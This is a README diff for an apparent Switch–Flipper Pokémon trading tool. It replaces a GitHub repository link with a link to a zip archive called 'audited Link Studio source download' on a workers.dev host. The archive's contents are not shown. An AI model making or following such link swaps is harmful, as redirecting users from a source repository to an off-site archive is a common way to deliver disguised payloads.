@@ -19,7 +19,8 @@ On 2026-09-27, a local build of this runtime completed two consecutive real Swit
 trades through GPIO, including cancel/reoffer and normal Stop. The user confirmed
 both Pokémon persisted after reopening Z-A. Stop during saving and controller loss
 have offline coverage; they were not physically verified in that session.
-See the [Flipper setup and verification notes](https://github.com/H644b/Pokemon-Spoofer/tree/main/flipper).
+Flipper setup and verification notes are in `flipper/README.md` and `flipper/WORK.md`
+in the [audited Link Studio source download](https://link-studio.timur-radjabov1.workers.dev/source/link-studio-source.zip).
 
 ## Status LED
 
